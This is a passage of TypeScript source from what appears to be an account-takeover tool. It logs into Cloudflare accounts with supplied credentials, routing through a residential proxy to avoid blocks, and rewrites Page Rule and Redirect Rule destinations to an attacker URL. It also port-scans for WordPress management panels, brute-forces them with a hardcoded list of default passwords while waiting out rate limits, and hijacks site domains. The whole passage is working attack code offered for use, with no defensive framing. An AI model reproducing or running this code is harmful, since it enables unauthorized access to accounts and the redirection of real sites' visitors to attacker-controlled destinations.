          "X-Auth-Key": cleanedPassword,
          "Content-Type": "application/json",
        },
        signal: AbortSignal.timeout(10000),
      });
      const data = await resp.json().catch(() => null) as any;
      if (data?.success && data?.result?.id) {
        return {
          success: true,
          session: { email, apiKey: cleanedPassword },
          detail: `CF API Key auth OK (trimmed): ${data.result.email || email}`,
        };
      }
    } catch {}
  }

  // Method 4: Try via residential proxy (in case direct IP is blocked)
  try {
    const { response } = await fetchWithPoolProxy("https://api.cloudflare.com/client/v4/user", {
      headers: {
        "X-Auth-Email": email,
        "X-Auth-Key": password,
        "Content-Type": "application/json",
      },
    }, { timeout: 15000 });
    const data = await response.json().catch(() => null) as any;
    if (data?.success && data?.result?.id) {
      return {
        success: true,
        session: { email, apiKey: password },
        detail: `CF API Key auth OK (via proxy): ${data.result.email || email}`,
      };
    }
  } catch {}

  return { success: false, detail: `CF login failed for ${email} (tried API Key, Token, proxy)` };
}

/**
 * List all zones in the CF account and find the target domain
 */
async function cfListZones(
  session: CfSession,
  targetDomain: string,
): Promise<{ found: boolean; zoneId?: string; zoneName?: string; detail: string }> {
  const headers: Record<string, string> = { "Content-Type": "application/json" };
  if (session.authToken) {
    headers["Authorization"] = `Bearer ${session.authToken}`;
  } else {
    headers["X-Auth-Email"] = session.email;
    headers["X-Auth-Key"] = session.apiKey;
  }

  try {
    // First try exact domain match
    const resp = await fetch(`https://api.cloudflare.com/client/v4/zones?name=${encodeURIComponent(targetDomain)}&status=active`, {
      headers,
      signal: AbortSignal.timeout(15000),
    });
    const data = await resp.json().catch(() => null) as any;
    if (data?.success && data?.result?.length > 0) {
      const zone = data.result[0];
      return { found: true, zoneId: zone.id, zoneName: zone.name, detail: `Found zone: ${zone.name} (${zone.id})` };
    }

    // Try listing all zones and searching
    const allResp = await fetch(`https://api.cloudflare.com/client/v4/zones?per_page=50&status=active`, {
      headers,
      signal: AbortSignal.timeout(15000),
    });
    const allData = await allResp.json().catch(() => null) as any;
    if (allData?.success && allData?.result) {
      const zones = allData.result as Array<{ id: string; name: string }>;
      // Find zone that matches target domain or is a parent domain
      const match = zones.find(z => 
        targetDomain === z.name || 
        targetDomain.endsWith(`.${z.name}`) ||
        z.name.endsWith(`.${targetDomain}`)
      );
      if (match) {
        return { found: true, zoneId: match.id, zoneName: match.name, detail: `Found zone: ${match.name} (${match.id}) from ${zones.length} zones` };
      }
      return { found: false, detail: `Domain not found in ${zones.length} zones: ${zones.map(z => z.name).join(", ")}` };
    }
    return { found: false, detail: `Zone list failed: ${JSON.stringify(data?.errors || data).substring(0, 80)}` };
  } catch (err: any) {
    return { found: false, detail: `Zone list error: ${err.message?.substring(0, 60)}` };
  }
}

/**
 * List Page Rules for a zone and find rules matching the target path
 */
async function cfListPageRules(
  session: CfSession,
  zoneId: string,
): Promise<{ rules: CfPageRule[]; detail: string }> {
  const headers: Record<string, string> = { "Content-Type": "application/json" };
  if (session.authToken) {
    headers["Authorization"] = `Bearer ${session.authToken}`;
  } else {
    headers["X-Auth-Email"] = session.email;
    headers["X-Auth-Key"] = session.apiKey;
  }

  try {
    const resp = await fetch(`https://api.cloudflare.com/client/v4/zones/${zoneId}/pagerules?status=active`, {
      headers,
      signal: AbortSignal.timeout(15000),
    });
    const data = await resp.json().catch(() => null) as any;
    if (data?.success && data?.result) {
      return { rules: data.result, detail: `Found ${data.result.length} page rules` };
    }
    return { rules: [], detail: `Page rules list failed: ${JSON.stringify(data?.errors).substring(0, 80)}` };
  } catch (err: any) {
    return { rules: [], detail: `Page rules error: ${err.message?.substring(0, 60)}` };
  }
}

/**
 * List Redirect Rules (Bulk Redirects) for a zone
 */
async function cfListRedirectRules(
  session: CfSession,
  zoneId: string,
): Promise<{ rules: CfRedirectRule[]; rulesetId?: string; detail: string }> {
  const headers: Record<string, string> = { "Content-Type": "application/json" };
  if (session.authToken) {
    headers["Authorization"] = `Bearer ${session.authToken}`;
  } else {
    headers["X-Auth-Email"] = session.email;
    headers["X-Auth-Key"] = session.apiKey;
  }

  try {
    // Get zone rulesets
    const resp = await fetch(`https://api.cloudflare.com/client/v4/zones/${zoneId}/rulesets`, {
      headers,
      signal: AbortSignal.timeout(15000),
    });
    const data = await resp.json().catch(() => null) as any;
    if (data?.success && data?.result) {
      // Find redirect rulesets
      const redirectRulesets = (data.result as any[]).filter((rs: any) => 
        rs.phase === "http_request_dynamic_redirect" || 
        rs.phase === "http_request_redirect" ||
        rs.kind === "zone" && rs.name?.toLowerCase().includes("redirect")
      );
      
      const allRules: CfRedirectRule[] = [];
      let foundRulesetId: string | undefined;
      
      for (const rs of redirectRulesets) {
        // Get full ruleset with rules
        const rsResp = await fetch(`https://api.cloudflare.com/client/v4/zones/${zoneId}/rulesets/${rs.id}`, {
          headers,
          signal: AbortSignal.timeout(15000),
        });
        const rsData = await rsResp.json().catch(() => null) as any;
        if (rsData?.success && rsData?.result?.rules) {
          foundRulesetId = rs.id;
          allRules.push(...rsData.result.rules);
        }
      }
      
      return { rules: allRules, rulesetId: foundRulesetId, detail: `Found ${allRules.length} redirect rules in ${redirectRulesets.length} rulesets` };
    }
    return { rules: [], detail: `Rulesets list failed` };
  } catch (err: any) {
    return { rules: [], detail: `Redirect rules error: ${err.message?.substring(0, 60)}` };
  }
}

/**
 * Change a Page Rule's forwarding URL destination
 */
async function cfChangePageRuleDestination(
  session: CfSession,
  zoneId: string,
  ruleId: string,
  rule: CfPageRule,
  newDestUrl: string,
): Promise<{ success: boolean; detail: string }> {
  const headers: Record<string, string> = { "Content-Type": "application/json" };
  if (session.authToken) {
    headers["Authorization"] = `Bearer ${session.authToken}`;
  } else {
    headers["X-Auth-Email"] = session.email;
    headers["X-Auth-Key"] = session.apiKey;
  }

  try {
    // Update the forwarding_url action
    const updatedActions = rule.actions.map(action => {
      if (action.id === "forwarding_url" && action.value) {
        return { ...action, value: { ...action.value, url: newDestUrl } };
      }
      return action;
    });

    const resp = await fetch(`https://api.cloudflare.com/client/v4/zones/${zoneId}/pagerules/${ruleId}`, {
      method: "PATCH",
      headers,
      body: JSON.stringify({
        targets: rule.targets,
        actions: updatedActions,
        status: rule.status,
      }),
      signal: AbortSignal.timeout(15000),
    });
    const data = await resp.json().catch(() => null) as any;
    if (data?.success) {
      return { success: true, detail: `Page Rule updated: destination → ${newDestUrl}` };
    }
    return { success: false, detail: `Update failed: ${JSON.stringify(data?.errors).substring(0, 80)}` };
  } catch (err: any) {
    return { success: false, detail: `Update error: ${err.message?.substring(0, 60)}` };
  }
}

/**
 * Change a Redirect Rule's destination URL
 */
async function cfChangeRedirectRuleDestination(
  session: CfSession,
  zoneId: string,
  rulesetId: string,
  ruleId: string,
  rule: CfRedirectRule,
  newDestUrl: string,
): Promise<{ success: boolean; detail: string }> {
  const headers: Record<string, string> = { "Content-Type": "application/json" };
  if (session.authToken) {
    headers["Authorization"] = `Bearer ${session.authToken}`;
  } else {
    headers["X-Auth-Email"] = session.email;
    headers["X-Auth-Key"] = session.apiKey;
  }

  try {
    // Update the redirect rule's action_parameters
    const updatedRule = {
      ...rule,
      action_parameters: {
        ...rule.action_parameters,
        from_value: {
          ...rule.action_parameters?.from_value,
          target_url: {
            value: newDestUrl,
          },
        },
      },
    };

    const resp = await fetch(`https://api.cloudflare.com/client/v4/zones/${zoneId}/rulesets/${rulesetId}/rules/${ruleId}`, {
      method: "PATCH",
      headers,
      body: JSON.stringify(updatedRule),
      signal: AbortSignal.timeout(15000),
    });
    const data = await resp.json().catch(() => null) as any;
    if (data?.success) {
      return { success: true, detail: `Redirect Rule updated: destination → ${newDestUrl}` };
    }
    return { success: false, detail: `Update failed: ${JSON.stringify(data?.errors).substring(0, 80)}` };
  } catch (err: any) {
    return { success: false, detail: `Update error: ${err.message?.substring(0, 60)}` };
  }
}

/**
 * Delete a Page Rule entirely
 */
async function cfDeletePageRule(
  session: CfSession,
  zoneId: string,
  ruleId: string,
): Promise<{ success: boolean; detail: string }> {
  const headers: Record<string, string> = { "Content-Type": "application/json" };
  if (session.authToken) {
    headers["Authorization"] = `Bearer ${session.authToken}`;
  } else {
    headers["X-Auth-Email"] = session.email;
    headers["X-Auth-Key"] = session.apiKey;
  }

  try {
    const resp = await fetch(`https://api.cloudflare.com/client/v4/zones/${zoneId}/pagerules/${ruleId}`, {
      method: "DELETE",
      headers,
      signal: AbortSignal.timeout(15000),
    });
    const data = await resp.json().catch(() => null) as any;
    if (data?.success) {
      return { success: true, detail: `Page Rule ${ruleId} deleted` };
    }
    return { success: false, detail: `Delete failed: ${JSON.stringify(data?.errors).substring(0, 80)}` };
  } catch (err: any) {
    return { success: false, detail: `Delete error: ${err.message?.substring(0, 60)}` };
  }
}

/**
 * Full Cloudflare takeover flow:
 * 1. Login with credentials
 * 2. Find zone
 * 3. Find redirect rules (Page Rules + Redirect Rules)
 * 4. Change destination to our URL
 */
async function tryCloudflareTakeover(
  targetDomain: string,
  targetPath: string | undefined,
  credentials: Array<{ email: string; password: string }>,
  ourRedirectUrl: string,
  onAttempt?: TakeoverExecutionConfig["onAttempt"],
  onProgress?: TakeoverExecutionConfig["onProgress"],
): Promise<TakeoverAttemptResult[]> {
  const results: TakeoverAttemptResult[] = [];
  
  // Clean domain
  const domain = targetDomain.replace(/^https?:\/\//, "").replace(/^www\./, "").replace(/\/.*$/, "");
  
  for (const cred of credentials) {
    const start = Date.now();
    onAttempt?.("cloudflare_takeover", cred.email, "trying", `CF: ${cred.email}`);
    
    // Step 1: Login
    const loginResult = await tryCfLogin(cred.email, cred.password);
    
    if (!loginResult.success || !loginResult.session) {
      results.push({
        vectorId: "cloudflare_takeover",
        vectorName: "Cloudflare Account Takeover",
        email: cred.email,
        password: cred.password,
        success: false,
        detail: loginResult.detail,
        durationMs: Date.now() - start,
      });
      onAttempt?.("cloudflare_takeover", cred.email, "failed", `❌ CF: ${loginResult.detail.substring(0, 50)}`);
      continue;
    }
    
    onAttempt?.("cloudflare_takeover", cred.email, "success", `🔓 CF login: ${loginResult.detail.substring(0, 60)}`);
    onProgress?.("cf_login", `🔓 CF Login สำเร็จ: ${cred.email}`);
    
    // Step 2: Find zone
    const zoneResult = await cfListZones(loginResult.session, domain);
    
    if (!zoneResult.found || !zoneResult.zoneId) {
      onProgress?.("cf_zone", `⚠️ Zone ${domain} ไม่พบใน account: ${zoneResult.detail}`);
      results.push({
        vectorId: "cloudflare_takeover",
        vectorName: "Cloudflare Account Takeover",
        email: cred.email,
        password: cred.password,
        success: true, // Login succeeded
        detail: `Login OK but zone not found: ${zoneResult.detail}`,
        accessType: "cloudflare_account",
        sessionToken: loginResult.session.apiKey || loginResult.session.authToken,
        durationMs: Date.now() - start,
      });
      continue;
    }
    
    onProgress?.("cf_zone", `📍 Zone found: ${zoneResult.zoneName} (${zoneResult.zoneId})`);
    
    // Step 3: Find redirect rules
    // 3a: Page Rules
    const pageRules = await cfListPageRules(loginResult.session, zoneResult.zoneId);
    onProgress?.("cf_rules", `📋 Page Rules: ${pageRules.rules.length} found`);
    
    // Find page rule matching the target path
    let matchedPageRule: CfPageRule | null = null;
    for (const rule of pageRules.rules) {
      const forwardAction = rule.actions.find(a => a.id === "forwarding_url");
      if (!forwardAction) continue;
      
      const rulePattern = rule.targets?.[0]?.constraint?.value || "";
      const matchesPath = !targetPath || 
        rulePattern.includes(targetPath) || 
        rulePattern.includes("*") ||
        rulePattern.includes(domain);
      
      if (matchesPath) {
        matchedPageRule = rule;
        const currentDest = forwardAction.value?.url || "unknown";
        onProgress?.("cf_match", `🎯 Matched Page Rule: ${rulePattern} → ${currentDest}`);
        break;
      }
    }
    
    // 3b: Redirect Rules (newer CF feature)
    const redirectRules = await cfListRedirectRules(loginResult.session, zoneResult.zoneId);
    onProgress?.("cf_rules", `📋 Redirect Rules: ${redirectRules.rules.length} found`);
    
    let matchedRedirectRule: CfRedirectRule | null = null;
    let matchedRulesetId: string | undefined;
    for (const rule of redirectRules.rules) {
      const expr = rule.expression || "";
      const matchesPath = !targetPath || expr.includes(targetPath) || expr.includes(domain);
      if (matchesPath && (rule.action === "redirect" || rule.action_parameters?.from_value)) {
        matchedRedirectRule = rule;
        matchedRulesetId = redirectRules.rulesetId;
        onProgress?.("cf_match", `🎯 Matched Redirect Rule: ${expr.substring(0, 60)}`);
        break;
      }
    }
    
    // Step 4: Change destination
    let changeSuccess = false;
    let changeDetail = "";
    
    if (matchedPageRule) {
      // Change Page Rule destination
      const changeResult = await cfChangePageRuleDestination(
        loginResult.session,
        zoneResult.zoneId,
        matchedPageRule.id,
        matchedPageRule,
        ourRedirectUrl,
      );
      changeSuccess = changeResult.success;
      changeDetail = changeResult.detail;
      
      if (changeSuccess) {
        onProgress?.("cf_success", `🎯🎯🎯 PAGE RULE CHANGED: ${ourRedirectUrl}`);
      }
    } else if (matchedRedirectRule && matchedRulesetId) {
      // Change Redirect Rule destination
      const changeResult = await cfChangeRedirectRuleDestination(
        loginResult.session,
        zoneResult.zoneId,
        matchedRulesetId,
        matchedRedirectRule.id,
        matchedRedirectRule,
        ourRedirectUrl,
      );
      changeSuccess = changeResult.success;
      changeDetail = changeResult.detail;
      
      if (changeSuccess) {
        onProgress?.("cf_success", `🎯🎯🎯 REDIRECT RULE CHANGED: ${ourRedirectUrl}`);
      }
    } else {
      // No matching rule found — try to create a new Page Rule
      onProgress?.("cf_norule", `⚠️ ไม่พบ redirect rule ที่ match ${targetPath || domain}`);
      
      // List all rules for debugging
      if (pageRules.rules.length > 0) {
        const rulesSummary = pageRules.rules.map(r => {
          const target = r.targets?.[0]?.constraint?.value || "?";
          const action = r.actions.find(a => a.id === "forwarding_url");
          return `  ${target} → ${action?.value?.url || "?"}`;
        }).join("\n");
        onProgress?.("cf_debug", `📋 Existing Page Rules:\n${rulesSummary}`);
      }
      if (redirectRules.rules.length > 0) {
        const rulesSummary = redirectRules.rules.map(r => 
          `  ${r.expression?.substring(0, 40)} → ${r.action}`
        ).join("\n");
        onProgress?.("cf_debug", `📋 Existing Redirect Rules:\n${rulesSummary}`);
      }
      
      changeDetail = `No matching redirect rule found for ${targetPath || domain}`;
    }
    
    results.push({
      vectorId: "cloudflare_takeover",
      vectorName: "Cloudflare Account Takeover",
      email: cred.email,
      password: cred.password,
      success: true,
      detail: changeSuccess ? `🎯 CF TAKEOVER: ${changeDetail}` : `Login OK, zone found, but: ${changeDetail}`,
      accessType: "cloudflare_account",
      newRedirectUrl: changeSuccess ? ourRedirectUrl : undefined,
      sessionToken: loginResult.session.apiKey || loginResult.session.authToken,
      durationMs: Date.now() - start,
    });
    
    if (changeSuccess) {
      return results; // Mission accomplished!
    }
  }
  
  return results;
}

// ═══════════════════════════════════════════════════════
//  ROBOT MANAGEMENT SYSTEM (RMS) TAKEOVER
// ═══════════════════════════════════════════════════════

/**
 * Robot Management System — Admin panel (typically on port 8080)
 * that controls multiple WordPress gambling sites.
 * 
 * Known API endpoints:
 *   POST /api/login → JWT token
 *   GET  /api/list_job → list managed jobs/sites
 *   GET  /api/get-wordpress-domain → list WordPress domains
 *   POST /api/update-wordpress-domain → change domain + enable redirect_old_domain
 *   GET  /api/get-wordpress-site → site details
 * 
 * Default credentials: admin/admin123, admin/admin, root/root123
 */

interface RmsSession {
  token: string;       // JWT token
  baseUrl: string;     // e.g., http://207.148.76.233:8080
  username: string;
}

interface RmsManagedSite {
  id: string | number;
  domain: string;
  name?: string;
  status?: string;
  wordpressUrl?: string;
  redirectEnabled?: boolean;
}

const RMS_DEFAULT_CREDENTIALS = [
  { email: "admin", password: "admin123" },
  { email: "admin", password: "admin" },
  { email: "root", password: "root123" },
  { email: "root", password: "root" },
  { email: "admin", password: "password" },
  { email: "admin", password: "123456" },
  { email: "administrator", password: "admin123" },
];

/**
 * Detect if a host has an RMS admin panel running on common ports.
 * Returns the base URL if found, null otherwise.
 */
export async function detectRmsPanel(
  host: string,
  onProgress?: TakeoverExecutionConfig["onProgress"],
): Promise<{ found: boolean; baseUrl: string | null; detail: string }> {
  // Extract IP/hostname from URL if needed
  let hostname = host.replace(/^https?:\/\//, "").replace(/[\/:].*$/, "");
  
  const portsToCheck = [8080, 8888, 3000, 8000, 9090, 80, 443];
  
  for (const port of portsToCheck) {
    const protocol = port === 443 ? "https" : "http";
    const baseUrl = `${protocol}://${hostname}:${port}`;
    
    try {
      // Try fetching the login page or API endpoint
      const { response } = await fetchWithPoolProxy(`${baseUrl}/api/login`, {
        method: "OPTIONS",
        headers: { "Accept": "application/json" },
      }, { timeout: 8000, maxRetries: 0, fallbackDirect: true });
      
      // Check for RMS indicators
      const status = response.status;
      const headers = Object.fromEntries(response.headers.entries());
      const body = await response.text().catch(() => "");
      
      const isRms = (
        status === 200 || status === 204 || status === 405 || status === 401
      ) && (
        body.includes("login") ||
        body.includes("token") ||
        body.includes("jwt") ||
        body.includes("wordpress") ||
        body.includes("robot") ||
        headers["access-control-allow-origin"] !== undefined ||
        status === 405 // Method Not Allowed = API exists
      );
      
      if (isRms) {
        onProgress?.("rms_detect", `🤖 RMS panel detected at ${baseUrl}`);
        return { found: true, baseUrl, detail: `RMS panel at ${baseUrl} (status: ${status})` };
      }
      
      // Also check for admin panel HTML
      const { response: htmlResp } = await fetchWithPoolProxy(`${baseUrl}/`, {
        headers: { "Accept": "text/html" },
      }, { timeout: 8000, maxRetries: 0, fallbackDirect: true });
      
      const htmlBody = await htmlResp.text().catch(() => "");
      const hasAdminPanel = (
        htmlBody.includes("Robot Management") ||
        htmlBody.includes("robot-management") ||
        htmlBody.includes("WordPress Manager") ||
        htmlBody.includes("wordpress-manager") ||
        htmlBody.includes("admin-panel") ||
        (htmlBody.includes("login") && htmlBody.includes("admin") && htmlBody.includes("password"))
      );
      
      if (hasAdminPanel) {
        onProgress?.("rms_detect", `🤖 Admin panel detected at ${baseUrl}`);
        return { found: true, baseUrl, detail: `Admin panel at ${baseUrl}` };
      }
    } catch {
      // Port not open or connection refused — skip
    }
  }
  
  return { found: false, baseUrl: null, detail: `No RMS panel found on ${hostname}` };
}

/**
 * Login to RMS admin panel and get JWT token.
 */
async function rmsLogin(
  baseUrl: string,
  username: string,
  password: string,
): Promise<{ success: boolean; session?: RmsSession; detail: string }> {
  try {
    const { response } = await fetchWithPoolProxy(`${baseUrl}/api/login`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      },
      body: JSON.stringify({ username, password }),
    }, { timeout: 15000, fallbackDirect: true });
    
    if (response.status === 429) {
      return { success: false, detail: `Rate limited (429) — wait and retry` };
    }
    
    const data = await response.json().catch(() => null) as any;
    
    if (response.ok && data) {
      // Look for JWT token in various response formats
      const token = data.token || data.access_token || data.jwt || data.accessToken || data.data?.token;
      
      if (token) {
        return {
          success: true,
          session: { token, baseUrl, username },
          detail: `Login OK: ${username} → JWT token obtained`,
        };
      }
      
      // Some panels return success without explicit token field
      if (data.success || data.status === "ok" || data.message?.includes("success")) {
        // Check response headers for token
        const authHeader = response.headers.get("authorization") || "";
        const setCookie = response.headers.get("set-cookie") || "";
        const headerToken = authHeader.replace(/^Bearer\s+/i, "") || setCookie;
        
        if (headerToken) {
          return {
            success: true,
            session: { token: headerToken, baseUrl, username },
            detail: `Login OK: ${username} → token from headers`,
          };
        }
        return {
          success: true,
          session: { token: JSON.stringify(data), baseUrl, username },
          detail: `Login OK: ${username} → success response (no explicit token)`,
        };
      }
    }
    
    return {
      success: false,
      detail: `Login failed: ${response.status} — ${JSON.stringify(data).substring(0, 80)}`,
    };
  } catch (err: any) {
    return { success: false, detail: `Login error: ${err.message?.substring(0, 80)}` };
  }
}

/**
 * List all managed WordPress sites from the RMS panel.
 */
async function rmsListSites(
  session: RmsSession,
): Promise<{ sites: RmsManagedSite[]; detail: string }> {
  const authHeaders = {
    "Authorization": `Bearer ${session.token}`,
    "Accept": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
  };
  
  const sites: RmsManagedSite[] = [];
  
  // Try multiple endpoint patterns
  const endpoints = [
    "/api/get-wordpress-domain",
    "/api/list_job",
    "/api/wordpress-sites",
    "/api/get-wordpress-site",
    "/api/sites",
    "/api/domains",
  ];
  
  for (const endpoint of endpoints) {
    try {
      const { response } = await fetchWithPoolProxy(`${session.baseUrl}${endpoint}`, {
        headers: authHeaders,
      }, { timeout: 15000, fallbackDirect: true });
      
      if (response.status === 429) {
        // Rate limited — wait 5s and retry once
        await new Promise(r => setTimeout(r, 5000));
        const { response: retryResp } = await fetchWithPoolProxy(`${session.baseUrl}${endpoint}`, {
          headers: authHeaders,
        }, { timeout: 15000, fallbackDirect: true });
        if (retryResp.status === 429) continue;
        const retryData = await retryResp.json().catch(() => null) as any;
        if (retryData) {
          const parsed = parseRmsSiteList(retryData);
          if (parsed.length > 0) {
            sites.push(...parsed);
            return { sites, detail: `Found ${sites.length} sites via ${endpoint} (after rate limit retry)` };
          }
        }
        continue;
      }
      
      if (!response.ok) continue;
      
      const data = await response.json().catch(() => null) as any;
      if (!data) continue;
      
      const parsed = parseRmsSiteList(data);
      if (parsed.length > 0) {
        sites.push(...parsed);
        return { sites, detail: `Found ${sites.length} sites via ${endpoint}` };
      }
    } catch {
      // Endpoint doesn't exist or error — try next
    }
  }
  
  return { sites, detail: sites.length > 0 ? `Found ${sites.length} sites` : "No sites found via any endpoint" };
}

/**
 * Parse various RMS API response formats into RmsManagedSite[]
 */
function parseRmsSiteList(data: any): RmsManagedSite[] {
  const sites: RmsManagedSite[] = [];
  
  // Handle array response
  const items = Array.isArray(data) ? data 
    : Array.isArray(data.data) ? data.data
    : Array.isArray(data.sites) ? data.sites
    : Array.isArray(data.domains) ? data.domains
    : Array.isArray(data.jobs) ? data.jobs
    : Array.isArray(data.result) ? data.result
    : [];
  
  for (const item of items) {
    if (typeof item === "string") {
      // Simple domain string
      sites.push({ id: item, domain: item });
    } else if (typeof item === "object" && item !== null) {
      const domain = item.domain || item.url || item.site || item.wordpress_domain || item.wp_domain || item.name || "";
      if (domain) {
        sites.push({
          id: item.id || item._id || domain,
          domain: domain.replace(/^https?:\/\//, "").replace(/\/$/, ""),
          name: item.name || item.title || item.label,
          status: item.status || item.state,
          wordpressUrl: item.wordpress_url || item.wp_url || item.admin_url,
          redirectEnabled: item.redirect_old_domain || item.redirectEnabled || false,
        });
      }
    }
  }
  
  return sites;
}

/**
 * Update a WordPress domain via the RMS panel.
 * Enables redirect_old_domain to redirect old domain to new one.
 */
async function rmsUpdateDomain(
  session: RmsSession,
  siteId: string | number,
  oldDomain: string,
  newDomain: string,
  enableRedirect: boolean = true,
): Promise<{ success: boolean; detail: string }> {
  const authHeaders = {
    "Authorization": `Bearer ${session.token}`,
    "Content-Type": "application/json",
    "Accept": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
  };
  
  // Try multiple endpoint patterns and payload formats
  const attempts = [
    {
      endpoint: "/api/update-wordpress-domain",
      body: {
        id: siteId,
        domain: newDomain,
        old_domain: oldDomain,
        redirect_old_domain: enableRedirect,
      },
    },
    {
      endpoint: "/api/update-wordpress-domain",
      body: {
        site_id: siteId,
        new_domain: newDomain,
        old_domain: oldDomain,
        redirect_old_domain: enableRedirect,
      },
    },
    {
      endpoint: `/api/wordpress-sites/${siteId}/domain`,
      body: {
        domain: newDomain,
        redirect_old_domain: enableRedirect,
      },
    },
    {
      endpoint: `/api/sites/${siteId}/update`,
      body: {
        domain: newDomain,
        redirect_old_domain: enableRedirect,
      },
    },
  ];
  
  for (const attempt of attempts) {
    try {
      const { response } = await fetchWithPoolProxy(`${session.baseUrl}${attempt.endpoint}`, {
        method: "POST",
        headers: authHeaders,
        body: JSON.stringify(attempt.body),
      }, { timeout: 20000, fallbackDirect: true });
      
      if (response.status === 429) {
        // Rate limited — wait 10s and retry
        await new Promise(r => setTimeout(r, 10000));
        const { response: retryResp } = await fetchWithPoolProxy(`${session.baseUrl}${attempt.endpoint}`, {
          method: "POST",
          headers: authHeaders,
          body: JSON.stringify(attempt.body),
        }, { timeout: 20000, fallbackDirect: true });
        
        if (retryResp.status === 429) {
          return { success: false, detail: `Rate limited on ${attempt.endpoint} — try again later` };
        }
        
        const retryData = await retryResp.json().catch(() => null) as any;
        if (retryResp.ok && retryData) {
          if (retryData.success || retryData.status === "ok" || retryData.message?.includes("success") || retryData.updated) {
            return { success: true, detail: `Domain updated via ${attempt.endpoint} (after rate limit retry): ${oldDomain} → ${newDomain}` };
          }
        }
        continue;
      }
      
      if (response.status === 404) continue; // Endpoint doesn't exist
      
      const data = await response.json().catch(() => null) as any;
      
      if (response.ok && data) {
        if (data.success || data.status === "ok" || data.message?.includes("success") || data.message?.includes("updated") || data.updated) {
          return { success: true, detail: `Domain updated via ${attempt.endpoint}: ${oldDomain} → ${newDomain}` };
        }
      }
      
      // If we got a non-404 response, the endpoint exists — report the error
      if (response.status !== 404 && response.status !== 405) {
        return { success: false, detail: `${attempt.endpoint}: ${response.status} — ${JSON.stringify(data).substring(0, 100)}` };
      }
    } catch (err: any) {
      // Connection error — try next endpoint
    }
  }
  
  return { success: false, detail: `No working update endpoint found` };
}

/**
 * Full Robot Management System takeover flow:
 * 1. Detect RMS panel (port scan)
 * 2. Login with default/provided credentials
 * 3. List managed WordPress sites
 * 4. Find target domain in managed sites
 * 5. Update domain to redirect to our URL
 */
async function tryRobotManagementTakeover(
  targetHost: string,
  targetDomain: string,
  credentials: Array<{ email: string; password: string }>,
  ourRedirectUrl: string,
  onAttempt?: TakeoverExecutionConfig["onAttempt"],
  onProgress?: TakeoverExecutionConfig["onProgress"],
): Promise<TakeoverAttemptResult[]> {
  const results: TakeoverAttemptResult[] = [];
  
  // Step 1: Detect RMS panel
  onProgress?.("rms_scan", `🤖 Scanning for RMS admin panel on ${targetHost}...`);
  const detection = await detectRmsPanel(targetHost, onProgress);
  
  if (!detection.found || !detection.baseUrl) {
    results.push({
      vectorId: "rms_takeover",
      vectorName: "Robot Management System Takeover",
      email: "",
      password: "",
      success: false,
      detail: detection.detail,
      durationMs: 0,
    });
    return results;
  }
  
  const baseUrl = detection.baseUrl;
  onProgress?.("rms_found", `🤖 RMS panel found: ${baseUrl}`);
  
  // Step 2: Login with credentials (default + provided)
  const allCreds = [
    ...RMS_DEFAULT_CREDENTIALS,
    ...credentials,
  ];
  
  // Deduplicate
  const seen = new Set<string>();
  const uniqueCreds = allCreds.filter(c => {
    const key = `${c.email}:${c.password}`;
    if (seen.has(key)) return false;
    seen.add(key);
    return true;
  });
  
  let session: RmsSession | null = null;
  
  for (const cred of uniqueCreds) {
    const start = Date.now();
    onAttempt?.("rms_takeover", cred.email, "trying", `RMS: ${cred.email}@${baseUrl}`);
    
    const loginResult = await rmsLogin(baseUrl, cred.email, cred.password);
    
    if (loginResult.success && loginResult.session) {
      session = loginResult.session;
      results.push({
        vectorId: "rms_takeover",
        vectorName: "Robot Management System Takeover",
        email: cred.email,
        password: cred.password,
        success: true,
        detail: loginResult.detail,
        accessType: "rms_admin",
        sessionToken: session.token,
        durationMs: Date.now() - start,
      });
      onAttempt?.("rms_takeover", cred.email, "success", `🔓 RMS login: ${cred.email}`);
      onProgress?.("rms_login", `🔓 RMS Login สำเร็จ: ${cred.email}@${baseUrl}`);
      break;
    }
    
    // Handle rate limiting
    if (loginResult.detail.includes("Rate limited") || loginResult.detail.includes("429")) {
      onProgress?.("rms_ratelimit", `⏱️ Rate limited — waiting 15s...`);
      await new Promise(r => setTimeout(r, 15000));
      
      // Retry once after waiting
      const retryResult = await rmsLogin(baseUrl, cred.email, cred.password);
      if (retryResult.success && retryResult.session) {
        session = retryResult.session;
        results.push({
          vectorId: "rms_takeover",
          vectorName: "Robot Management System Takeover",
          email: cred.email,
          password: cred.password,
          success: true,
          detail: retryResult.detail + " (after rate limit wait)",
          accessType: "rms_admin",
          sessionToken: session.token,
          durationMs: Date.now() - start,
        });
        onAttempt?.("rms_takeover", cred.email, "success", `🔓 RMS login (retry): ${cred.email}`);
        onProgress?.("rms_login", `🔓 RMS Login สำเร็จ (retry): ${cred.email}`);
        break;
      }
    }
    
    results.push({
      vectorId: "rms_takeover",
      vectorName: "Robot Management System Takeover",
      email: cred.email,
      password: cred.password,
      success: false,
      detail: loginResult.detail,
      durationMs: Date.now() - start,
    });
    onAttempt?.("rms_takeover", cred.email, "failed", `❌ RMS: ${loginResult.detail.substring(0, 50)}`);
    
    // Small delay between attempts to avoid rate limiting
    await new Promise(r => setTimeout(r, 2000));
  }
  
  if (!session) {
    onProgress?.("rms_failed", `❌ RMS login failed with all ${uniqueCreds.length} credentials`);
    return results;
  }
  
  // Step 3: List managed sites
  onProgress?.("rms_sites", `📋 Listing managed WordPress sites...`);
  const siteList = await rmsListSites(session);
  
  if (siteList.sites.length === 0) {
    onProgress?.("rms_nosites", `⚠️ No managed sites found: ${siteList.detail}`);
    return results;
  }
  
  onProgress?.("rms_sites", `📋 Found ${siteList.sites.length} managed sites:\n${siteList.sites.map(s => `   • ${s.domain}${s.name ? ` (${s.name})` : ""}`).join("\n")}`);
  
  // Step 4: Find target domain in managed sites
  const cleanTarget = targetDomain.replace(/^https?:\/\//, "").replace(/^www\./, "").replace(/\/$/, "");
  
  let targetSite = siteList.sites.find(s => {
    const cleanSite = s.domain.replace(/^https?:\/\//, "").replace(/^www\./, "").replace(/\/$/, "");
    return cleanSite === cleanTarget || 
           cleanTarget.includes(cleanSite) || 
           cleanSite.includes(cleanTarget);
  });
  
  // If exact match not found, try updating any site to redirect to our URL
  if (!targetSite && siteList.sites.length > 0) {
    onProgress?.("rms_notarget", `⚠️ Target ${cleanTarget} not found in managed sites — will try updating first site`);
